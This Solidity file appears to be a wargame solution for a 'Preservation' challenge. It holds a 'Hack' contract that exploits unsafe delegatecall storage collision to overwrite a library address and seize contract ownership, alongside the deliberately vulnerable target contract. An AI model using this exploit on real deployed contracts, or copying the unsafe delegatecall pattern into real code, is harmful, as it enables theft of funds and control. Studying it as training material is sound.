// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}
contract Hack {
    // Align storage layout same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {

        target.setFirstTime(uint256(uint160(address(this))));

        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
contract Preservation {


  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 

  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }


  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}


contract LibraryContract {


  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
    
  }
}